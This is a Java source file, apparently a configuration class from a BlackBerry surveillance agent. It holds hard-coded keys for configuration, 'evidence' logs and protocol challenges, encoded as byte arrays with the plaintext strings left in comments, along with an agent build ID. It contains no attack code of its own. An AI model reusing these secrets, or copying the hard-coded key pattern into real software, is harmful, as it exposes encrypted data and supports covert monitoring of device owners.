//#preprocess
package blackberry.config;

public class InstanceKeys extends KeysGetter {

    // require 'digest/md5'
    // .unpack("c*").map { |c| ",(byte) 0x" + c.to_s(16) }.join("")
    // Digest::MD5.hexdigest(a)
    //private static String conf = "6uo_E0S4w_FD0j9NEhW2UpFw9rwy90LY";
    private byte[] conf = new byte[] { (byte) 0x36, (byte) 0x75, (byte) 0x6f,
            (byte) 0x5f, (byte) 0x45, (byte) 0x30, (byte) 0x53, (byte) 0x34,
            (byte) 0x77, (byte) 0x5f, (byte) 0x46, (byte) 0x44, (byte) 0x30,
            (byte) 0x6a, (byte) 0x39, (byte) 0x4e, (byte) 0x45, (byte) 0x68,
            (byte) 0x57, (byte) 0x32, (byte) 0x55, (byte) 0x70, (byte) 0x46,
            (byte) 0x77, (byte) 0x39, (byte) 0x72, (byte) 0x77, (byte) 0x79,
            (byte) 0x39, (byte) 0x30, (byte) 0x4c, (byte) 0x59 };

    //private static String evidence = "WfClq6HxbSaOuJGaH5kWXr7dQgjYNSNg";
    private byte[] log = new byte[] { (byte) 0x57, (byte) 0x66, (byte) 0x43,
            (byte) 0x6c, (byte) 0x71, (byte) 0x36, (byte) 0x48, (byte) 0x78,
            (byte) 0x62, (byte) 0x53, (byte) 0x61, (byte) 0x4f, (byte) 0x75,
            (byte) 0x4a, (byte) 0x47, (byte) 0x61, (byte) 0x48, (byte) 0x35,
            (byte) 0x6b, (byte) 0x57, (byte) 0x58, (byte) 0x72, (byte) 0x37,
            (byte) 0x64, (byte) 0x51, (byte) 0x67, (byte) 0x6a, (byte) 0x59,
            (byte) 0x4e, (byte) 0x53, (byte) 0x4e, (byte) 0x67 };

    //private static String signature = "ANgs9oGFnEL_vxTxe9eIyBx5lZxfd6QZ";
    private byte[] proto = new byte[] { (byte) 0x41, (byte) 0x4e, (byte) 0x67,
            (byte) 0x73, (byte) 0x39, (byte) 0x6f, (byte) 0x47, (byte) 0x46,
            (byte) 0x6e, (byte) 0x45, (byte) 0x4c, (byte) 0x5f, (byte) 0x76,
            (byte) 0x78, (byte) 0x54, (byte) 0x78, (byte) 0x65, (byte) 0x39,
            (byte) 0x65, (byte) 0x49, (byte) 0x79, (byte) 0x42, (byte) 0x78,
            (byte) 0x35, (byte) 0x6c, (byte) 0x5a, (byte) 0x78, (byte) 0x66,
            (byte) 0x64, (byte) 0x36, (byte) 0x51, (byte) 0x5a };

    //static String demo = "Pg-WaVyPzMMMMmGbhP6qAigT"; //MD5: 863d9effe70187254d3c5e9c76613a99
    private byte[] demo = new byte[] { (byte) 0x50, (byte) 0x67, (byte) 0x2d,
            (byte) 0x57, (byte) 0x61, (byte) 0x56, (byte) 0x79, (byte) 0x50,
            (byte) 0x7a, (byte) 0x4d, (byte) 0x4d, (byte) 0x4d, (byte) 0x4d,
            (byte) 0x6d, (byte) 0x47, (byte) 0x62, (byte) 0x68, (byte) 0x50,
            (byte) 0x36, (byte) 0x71, (byte) 0x41, (byte) 0x69, (byte) 0x67,
            (byte) 0x54 };

    static String agentID = "EMp7Ca7-fpOBIr"; // MD5: b1688ffaaaafd7c1cab52e630b53178f

    private static byte[] byteLogKey;
    private static byte[] byteProtoKey;
    private static byte[] byteConfKey;
    private static byte[] byteInstanceID;

    boolean seven = true;

    public InstanceKeys() {
    }

    /**
     * Gets the aes key.
     * 
     * @return the aes key
     */
    public byte[] getLogKey() {
        if (byteLogKey == null) {
            byteLogKey = keyFromString(log);
            if (byteLogKey == null) {
                seven = false;
                byteLogKey = log;
            }

        }
        return byteLogKey;
    }

    /**
     * Gets the builds the id.
     * 
     * @return the builds the id
     */
    public byte[] getBuildID() {
        return agentID.getBytes();
    }

    /**
     * Gets the challenge key.
     * 
     * @return the challenge key
     */
    public byte[] getProtoKey() {
        if (byteProtoKey == null) {
            byteProtoKey = keyFromString(proto);
            if (byteProtoKey == null) {
                seven = false;
                byteProtoKey = proto;
            }
        }

        return byteProtoKey;
    }

    /**
     * Gets the conf key.
     * 
     * @return the conf key
     */
    public byte[] getConfKey() {
        if (byteConfKey == null) {
            byteConfKey = keyFromString(conf);
            if (byteConfKey == null) {
                seven = false;
                byteConfKey = conf;
            }
        }

        return byteConfKey;
    }

    public byte[] getDemo() {
        return demo;
    }

    public boolean isSeven() {
        return seven;
    }

}
